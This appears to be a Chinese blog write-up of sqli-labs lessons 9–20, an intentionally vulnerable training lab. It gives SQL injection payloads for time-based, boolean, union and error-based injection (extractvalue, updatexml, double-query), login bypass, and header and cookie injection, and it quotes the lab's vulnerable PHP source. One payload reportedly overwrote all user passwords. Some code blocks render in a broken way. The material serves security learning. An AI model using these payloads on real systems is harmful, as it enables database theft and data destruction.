<h2 id="Less-9-GET-Blind-Time-based-Single-Quotes-基于时间的GET单引号盲注"><a href="#Less-9-GET-Blind-Time-based-Single-Quotes-基于时间的GET单引号盲注" class="headerlink" title="Less-9 GET - Blind - Time based. -  Single Quotes  (基于时间的GET单引号盲注)"></a>Less-9 GET - Blind - Time based. -  Single Quotes  (基于时间的GET单引号盲注)</h2><p>不管输入什么页面都显示一样-&gt;<font color="green">时间盲注</font></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=1' and sleep(3) %23</span><br></pre></td></tr></table></figure>

<p>明显延迟</p>
<p>爆破方式参看less-5</p>
<h2 id="Less-10-GET-Blind-Time-based-double-quotes-基于时间的双引号盲注"><a href="#Less-10-GET-Blind-Time-based-double-quotes-基于时间的双引号盲注" class="headerlink" title="Less-10 GET - Blind - Time based - double quotes (基于时间的双引号盲注)"></a>Less-10 GET - Blind - Time based - double quotes (基于时间的双引号盲注)</h2><p>把9中的单引号改成双引号</p>
<h2 id="Less-11-POST-Error-Based-Single-quotes-String-基于错误的POST型单引号字符型注入"><a href="#Less-11-POST-Error-Based-Single-quotes-String-基于错误的POST型单引号字符型注入" class="headerlink" title="Less-11 POST - Error Based - Single quotes- String (基于错误的POST型单引号字符型注入)"></a>Less-11 POST - Error Based - Single quotes- String (基于错误的POST型单引号字符型注入)</h2><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200812203626309.png"  alt="image-20200812203626309" style="zoom:33%;">

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username：&#39; or 1&#x3D;1 ##</span><br><span class="line">password: a</span><br></pre></td></tr></table></figure>

<p>返回：</p>
<p>Your Login name:Dumb<br>Your Password:Dumb</p>
<p>使用Dumb登录，成功</p>
<p>使用hackbar</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&#39; order by 2## &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>

<p>返回</p>
<p>Your Login name:admin<br>Your Password:admin</p>
<p>使用union查询</p>
<p><font color="green">注意，uname是错的，才能显示出union后的内容</font></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;a&#39; union select 1,database() ## &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>

<p>返回</p>
<p>Your Login name:1<br>Your Password:security</p>
<p>数据库名security</p>
<h2 id="Less-12-POST-Error-Based-Double-quotes-String-with-twist-基于错误的双引号POST型字符型变形的注入"><a href="#Less-12-POST-Error-Based-Double-quotes-String-with-twist-基于错误的双引号POST型字符型变形的注入" class="headerlink" title="Less-12 POST - Error Based - Double quotes- String-with twist (基于错误的双引号POST型字符型变形的注入)"></a>Less-12 POST - Error Based - Double quotes- String-with twist (基于错误的双引号POST型字符型变形的注入)</h2><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200812205756771.png"  alt="image-20200812205756771" style="zoom:33%;">

<p>输入<code>‘</code>，无反应，输入<code>&quot;</code></p>
<p>返回</p>
<figure class="highlight plain"><figcaption><span>have an error in your SQL syntax; check the manual that corresponds to  your MySQL server version for the right syntax to use near '""") and  password</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">看下源码</span><br><span class="line"></span><br><span class="line">![img](sqli-labs.assets&#x2F;20180822112455820.png)</span><br><span class="line"></span><br><span class="line">发现还有个括号，构造闭合语句</span><br></pre></td></tr></table></figure>
<p>uname=1”) or 1=1## &amp;passwd=1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">成功返回</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## Less-13 POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">还是那个输入框，输入&#96;&#96;&#96;&#39;&#96;&#96;&#96;,</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;You have an error in your SQL syntax; check the manual that corresponds to  your MySQL server version for the right syntax to use near &#39;&#39;&#39;&#39;) and  password&#x3D;(&#39;&#39;) LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure>

<p>发现是通过<code>(&#39;&#39;)</code>闭合的</p>
<p>输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;) or 1&#x3D;1 ## uname&#x3D;1&#39;) or 1&#x3D;1## &amp;passwd&#x3D;1</span><br></pre></td></tr></table></figure>

<p>成功登录，但是没有回显信息</p>
<p>可以通过or语句判断输入信息是否正确（1=1处）</p>
<h2 id="Less-14-POST-Double-Injection-Single-quotes-String-twist-POST单引号变形双注入"><a href="#Less-14-POST-Double-Injection-Single-quotes-String-twist-POST单引号变形双注入" class="headerlink" title="Less-14 POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)"></a>Less-14 POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)</h2><p>输入双引号</p>
<p>报错</p>
<figure class="highlight plain"><figcaption><span>have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '""" and password</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">注释符不可用</span><br><span class="line"></span><br><span class="line">使双引号闭合</span><br></pre></td></tr></table></figure>
<p>uname: “ or 1=1 or “<br>passwd: 1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">登录成功</span><br></pre></td></tr></table></figure>
<p>uname=” or 1=2 or “  &amp;passwd=admin&amp;submit=Submit</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">登录失败，说明可以在1&#x3D;2处构造</span><br><span class="line"></span><br><span class="line">###### extractvalue(目标xml文档，xml路径)</span><br><span class="line"></span><br><span class="line">对XML文档进行查询的函数</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;sql</span><br><span class="line">uname&#x3D;admin&quot; and extractvalue(1,concat(0x7e,(select database()))) and &quot;  &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>

<p>返回</p>
<figure class="highlight xpath"><figcaption><span>syntax error: '~security'```</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">```sql</span><br><span class="line">uname=admin<span class="string">" and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and "</span>  &amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure>

<p>返回</p>
<figure class="highlight xpath"><figcaption><span>syntax error: '~5.5.53~'```</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## less-15 POST - Blind- Boolian/time Based - Single quotes (基于bool型/时间延迟单引号POST型盲注)</span><br><span class="line"></span><br><span class="line">没有回显</span><br></pre></td></tr></table></figure>
<p>‘ or 1=1 or ‘1’=’2</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">登录成功</span><br></pre></td></tr></table></figure>
<p>‘ or 1=(if(substr(version(),1,1)=5,1,0)) or ‘1’=’2</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## Less-16 POST - Blind- Boolian&#x2F;Time Based - Double quotes (基于bool型&#x2F;时间延迟的双引号POST型盲注)</span><br><span class="line"></span><br><span class="line">上输入什么都没有反应</span><br></pre></td></tr></table></figure>
<p>“) or 1=1 or “1”=(“2</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>admin”)##</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">均登录成功</span><br><span class="line"></span><br><span class="line">可以使用延迟注入</span><br><span class="line"></span><br><span class="line">## Less-17 POST - Update Query- Error Based - String (基于错误的更新查询POST注入)</span><br><span class="line"></span><br><span class="line">页面提示：password reset</span><br><span class="line"></span><br><span class="line">![image-20200814133539931](sqli-labs.assets&#x2F;image-20200814133539931.png)</span><br><span class="line"></span><br><span class="line">&gt;一下转载自：https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;ee6446e7f93c</span><br><span class="line">&gt;</span><br><span class="line">&gt;查看源码发现对&#96;user name&#96;表单进行了过滤：</span><br><span class="line">&gt;</span><br><span class="line">&gt;</span><br><span class="line">&gt;</span><br><span class="line">&gt;&#96;&#96;&#96;php</span><br><span class="line">&gt;&#x2F;&#x2F; take the variables</span><br><span class="line">&gt;if(isset($_POST[&#39;uname&#39;]) &amp;&amp; isset($_POST[&#39;passwd&#39;]))</span><br><span class="line">&gt;&#123;</span><br><span class="line">&gt;&#x2F;&#x2F;making sure uname is not injectable</span><br><span class="line">&gt;$uname&#x3D;check_input($_POST[&#39;uname&#39;]);  </span><br><span class="line">&gt;$passwd&#x3D;$_POST[&#39;passwd&#39;];</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;<span class="function"><span class="keyword">function</span> <span class="title">check_input</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">       &#123;</span><br><span class="line">       <span class="comment">// truncation (see comments)</span></span><br><span class="line">       $value = substr($value,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">       <span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">           &#123;</span><br><span class="line">           $value = stripslashes($value);</span><br><span class="line">           &#125;</span><br><span class="line">       <span class="comment">// Quote if not a number</span></span><br><span class="line">       <span class="keyword">if</span> (!ctype_digit($value))</span><br><span class="line">           &#123;</span><br><span class="line">           $value = <span class="string">"'"</span> . mysql_real_escape_string($value) . <span class="string">"'"</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">else</span></span><br><span class="line">       &#123;</span><br><span class="line">       $value = intval($value);</span><br><span class="line">       &#125;</span><br><span class="line">   <span class="keyword">return</span> $value;</span><br></pre></td></tr></table></figure>

<p>函数<code>check_input（）</code>的作用就是检查用户输入，并将用户输入安全化，其中的<code>mysql_real_escape_string()</code>会在<code>\x00, \n, \r, \, &#39;, &quot; and \x1a</code>这些字符前加入反斜线进行转义，防止注入，而且这个函数也避免了宽字节注入的危险。</p>
<p>3.当然，还不止，<code>new password</code>也不是和之前一样轻易试出注入类型，因为有<code>user name</code>的限制，如果<code>new password</code>不对，那么怎么试都自然是错的。因为看了大佬的解题思路，知道了为单引号闭合，SQL语句为：<code>@$sql=&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;; $update=&quot;UPDATE users SET password = &#39;$passwd&#39; WHERE username=&#39;$row1&#39;&quot;;</code>且知道有用户名为<code>admin</code>(这个用户名一般都有)。所以就直接考虑构造了。</p>
<p>4.首先考虑到不能回显有意义的信息，所以首选前面一直用的双注入查询 构造如下：<code>user name:</code>填<code>admin</code> ,而<code>new password:</code>填<code>&#39; and (select 1 from (select count(*),concat((select concat(schema_name,&#39;;&#39;) from information_schema.schemata limit 0,1),floor(rand()*2)) as x from information_schema.tables group by x) as a)##</code></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="https:////upload-images.jianshu.io/upload_images/9216631-fdde6fea7fe0253f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/951/format/webp"  alt="img"></p>
<p>剩下的构造不多说，和<code>Less-13</code>一样，一个一个爆就好。<br>5.在这里，尝试使用一种新的注入方法，基于<code>extractvalue()</code>和<code>updatexml()</code>的报错注入，详情请看: <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fblog.csdn.net%2Fzpy1998zpy%2Farticle%2Fdetails%2F80631036" target="_blank" rel="noopener">学习基于extractvalue()和updatexml()的报错注入</a>，同时，下面的注入丢默认<code>user name:</code>填<code>admin</code><br>6.先使用<code>updatexml()</code>进行注入，构造为<code>&#39; and updatexml(1,concat(&#39;~&#39;,(select version())),1)##</code> 获取相应版本:</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="https:////upload-images.jianshu.io/upload_images/9216631-fac10c084ccff139.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/800/format/webp"  alt="img"></p>
<p>获取数据库名称：<code>&#39; and updatexml(1,concat(&#39;~&#39;,(select database())),1)##</code></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="https:////upload-images.jianshu.io/upload_images/9216631-a445854179a5e2a9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/808/format/webp"  alt="img"></p>
<p>获取表名：<code>&#39; and updatexml(1,concat(&#39;~&#39;,(select concat(table_name,&#39;;&#39;) from information_schema.tables where table_schema=&#39;security&#39; limit 0,1)),1)##</code></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="https:////upload-images.jianshu.io/upload_images/9216631-22a805a151e67f06.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/819/format/webp"  alt="img"></p>
<p>改变<code>limit n,1</code>即可获取其他表名。</p>
<p>获取列名：<code>&#39; and updatexml(1,concat(&#39;~&#39;,(select concat(column_name,&#39;;&#39;) from information_schema.columns where table_name=&#39;emails&#39; limit 0,1)),1)##</code></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="https:////upload-images.jianshu.io/upload_images/9216631-872949fbf49ec071.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/785/format/webp"  alt="img"></p>
<p>同样，改变<code>limit n,1</code>即可。</p>
<p>获取内容：这样，不行<code>&#39; and updatexml(1,concat(&#39;~&#39;,(select concat(username,&#39;;&#39;,password) from information_schema.tables where table_name=&#39;security&#39; limit 0,1)),1)##</code> 报错如下：</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="https:////upload-images.jianshu.io/upload_images/9216631-3b8a2dd34c70530c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/823/format/webp"  alt="img"></p>
<p>这样：也不行<code>&#39; and updatexml(1,concat(&#39;~&#39;,(select concat(username,&#39;;&#39;,password) from security.users limit 0,1)),1)##</code> 报错如下：</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="https:////upload-images.jianshu.io/upload_images/9216631-e7e22cb9fc8a38cf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/784/format/webp"  alt="img"></p>
<p>这样：发现可以了，但是<code>password</code>成了0，一下子把所有的用户密码都改成了0，后面的可能就有问题了。<code>&#39; or (select 1 from (select count(*),concat((select concat(username,&#39;: &#39;,password,&#39;;&#39;) from security.users limit 0,1),floor(rand()*2)) as x from security.users group by x) as a)##</code></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="https:////upload-images.jianshu.io/upload_images/9216631-c9450c04670427b9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/822/format/webp"  alt="img"></p>
<p>7.使用<code>extractvalue()</code>，和<code>updatexml()</code>十分相似，用法也差不多，甚至看起来跟直观些。构造：<code>&#39; and extractvalue(1,concat(&#39;~&#39;,(select version())))##</code></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="https:////upload-images.jianshu.io/upload_images/9216631-f35dd602fedb0c24.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/771/format/webp"  alt="img"></p>
<p>剩下的语句和<code>updatexml()</code>的类似。</p>
</blockquote>
<h2 id="Less-18-POST-Header-Injection-Uagent-field-Error-based-基于错误的用户代理，头部POST注入"><a href="#Less-18-POST-Header-Injection-Uagent-field-Error-based-基于错误的用户代理，头部POST注入" class="headerlink" title="Less-18 POST - Header Injection - Uagent field - Error based (基于错误的用户代理，头部POST注入)"></a>Less-18 POST - Header Injection - Uagent field - Error based (基于错误的用户代理，头部POST注入)</h2><p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200814140630605.png"  alt="image-20200814140630605"></p>
<p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'uname'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>]))</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">    $uname = check_input($_POST[<span class="string">'uname'</span>]);</span><br><span class="line">    $passwd = check_input($_POST[<span class="string">'passwd'</span>]);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT  users.username, users.password FROM users 	WHERE users.username=$uname and users.password=$passwd</span></span><br><span class="line"><span class="string">ORDER BY users.id DESC LIMIT 0,1"</span>;</span><br><span class="line">$result1 = mysql_query($sql);</span><br><span class="line">$row1 = mysql_fetch_array($result1);</span><br><span class="line">    <span class="keyword">if</span>($row1)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;font color= "##FFFF00" font size = 3 &gt;'</span>;</span><br><span class="line">        $insert=<span class="string">"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)"</span>;</span><br><span class="line">        mysql_query($insert);</span><br><span class="line">        <span class="comment">//echo 'Your IP ADDRESS is: ' .$IP;</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">        <span class="comment">//echo "&lt;br&gt;";</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;font color= "##0000ff" font size = 3 &gt;'</span>;          </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Your User Agent is: '</span> .$uagent;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        print_r(mysql_error());         </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;img src="../images/flag.jpg"  /&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;font color= "##0000ff" font size="3"&gt;'</span>;</span><br><span class="line">        <span class="comment">//echo "Try again looser";</span></span><br><span class="line">        print_r(mysql_error());</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;           </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;img src="../images/slap.jpg"   /&gt;'</span>;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>在插入语句<code>$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)&quot;;</code>前没有进行过滤</p>
<p>从uagent下手，用burpsuite抓包</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200814143227128.png"  alt="image-20200814143227128"></p>
<blockquote>
<p>4.易知，只要保证<code>User-Agent:</code>字段内容，即<code>uagent</code>保持单引号闭合，且使用双查询注入或使用<code>extractvalue()</code>或<code>updatexml()</code>构造相应语句即可（因为是在插入语句中，只能通过报错获取我们想要的信息）。</p>
</blockquote>
<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200814145058890.png"  alt="image-20200814145058890"></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200814145117240.png"  alt="image-20200814145117240"></p>
<blockquote>
<p>5.构造语句查询数据库名：<br>构造一：<code>&#39; and updatexml(1,concat(&#39;~&#39;,(select database())),1) and &#39;1&#39;=&#39;1</code></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="https:////upload-images.jianshu.io/upload_images/9216631-8b4f0d3fd2f8d3c8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/893/format/webp"  alt="img"></p>
<p>构造二：<code>&#39; and extractvalue(1,concat(&#39;~&#39;,(select database()))) and &#39;1&#39;=&#39;1</code></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="https:////upload-images.jianshu.io/upload_images/9216631-028f8d52a66c6242.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/884/format/webp"  alt="img"></p>
<p>构造三：<code>&#39; and (select 1 from (select count(*),concat(database(),&#39;;&#39;,floor(rand()*2)) as x from information_schema.tables group by x)as a) and &#39;1&#39;=&#39;1</code></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="https:////upload-images.jianshu.io/upload_images/9216631-192483d02291c94d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp"  alt="img"></p>
</blockquote>
<h2 id="Less-19-POST-Header-Injection-Referer-field-Error-based-基于头部的Referer-POST报错注入"><a href="#Less-19-POST-Header-Injection-Referer-field-Error-based-基于头部的Referer-POST报错注入" class="headerlink" title="Less-19 POST - Header Injection - Referer field - Error based (基于头部的Referer POST报错注入)"></a>Less-19 POST - Header Injection - Referer field - Error based (基于头部的Referer POST报错注入)</h2><p>回显返回referer</p>
<p>php文件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sql-connect.php"</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="comment">// truncation (see comments)</span></span><br><span class="line">		$value = substr($value,<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">		<span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">			&#123;</span><br><span class="line">			$value = stripslashes($value);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Quote if not a number</span></span><br><span class="line">		<span class="keyword">if</span> (!ctype_digit($value))</span><br><span class="line">			&#123;</span><br><span class="line">			$value = <span class="string">"'"</span> . mysql_real_escape_string($value) . <span class="string">"'"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">		$value = intval($value);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> $value;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$uagent = $_SERVER[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line">	$IP = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'Your IP ADDRESS is: '</span> .$IP;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'uname'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>]))</span><br><span class="line"></span><br><span class="line">	&#123;</span><br><span class="line">	$uname = check_input($_POST[<span class="string">'uname'</span>]);</span><br><span class="line">	$passwd = check_input($_POST[<span class="string">'passwd'</span>]);</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="comment">//logging the connection parameters to a file for analysis.	</span></span><br><span class="line">	$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">	fwrite($fp,<span class="string">'Referer:'</span>.$uname.<span class="string">"\n"</span>);</span><br><span class="line">	</span><br><span class="line">	fclose($fp);</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	$sql=<span class="string">"SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1"</span>;</span><br><span class="line">	$result1 = mysql_query($sql);</span><br><span class="line">	$row1 = mysql_fetch_array($result1);</span><br><span class="line">		<span class="keyword">if</span>($row1)</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&lt;font color= "##FFFF00" font size = 3 &gt;'</span>;</span><br><span class="line">			$insert=<span class="string">"INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')"</span>;</span><br><span class="line">			mysql_query($insert);</span><br><span class="line">			<span class="comment">//echo 'Your IP ADDRESS is: ' .$IP;</span></span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">			<span class="comment">//echo "&lt;br&gt;";</span></span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&lt;font color= "##0000ff" font size = 3 &gt;'</span>;			</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'Your Referer is: '</span> .$uagent;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">			print_r(mysql_error());			</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&lt;img src="../images/flag.jpg" /&gt;'</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;			</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&lt;font color= "##0000ff" font size="3"&gt;'</span>;</span><br><span class="line">			<span class="comment">//echo "Try again looser";</span></span><br><span class="line">			print_r(mysql_error());</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;			</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&lt;img src="../images/slap.jpg"  /&gt;'</span>;	</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">			&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用burpsuite将referer改成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Referer:&#39;and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#39;</span><br></pre></td></tr></table></figure>

<p>或者在referer后面加*，使用sqlmap</p>
<h2 id="Less-20-POST-Cookie-injections-Uagent-field-Error-based-基于错误的cookie头部POST注入"><a href="#Less-20-POST-Cookie-injections-Uagent-field-Error-based-基于错误的cookie头部POST注入" class="headerlink" title="Less-20 POST - Cookie injections - Uagent field - Error based (基于错误的cookie头部POST注入)"></a>Less-20 POST - Cookie injections - Uagent field - Error based (基于错误的cookie头部POST注入)</h2><p>输入admin、admin</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200821173723827.png"  alt="image-20200821173723827"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line">	<span class="keyword">include</span>(<span class="string">"../sql-connections/sql-connect.php"</span>);</span><br><span class="line">	error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_COOKIE[<span class="string">'uname'</span>]))</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line">	<span class="keyword">include</span>(<span class="string">"../sql-connections/sql-connect.php"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;div style=' margin-top:20px;color:#FFF; font-size:24px; text-align:center'&gt; Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color='#FF0000'&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;/div&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;div  align='center' style='margin:20px 0px 0px 510px;border:20px; background-color:#0CF; text-align:center;width:400px; height:150px;'&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;div style='padding-top:10px; font-size:15px;'&gt;"</span>;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;!--Form to post the contents --&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;form action=" " name="form1" method="post"&gt;'</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">' &lt;div style="margin-top:15px; height:30px;"&gt;Username : &amp;nbsp;&amp;nbsp;&amp;nbsp;'</span>;</span><br><span 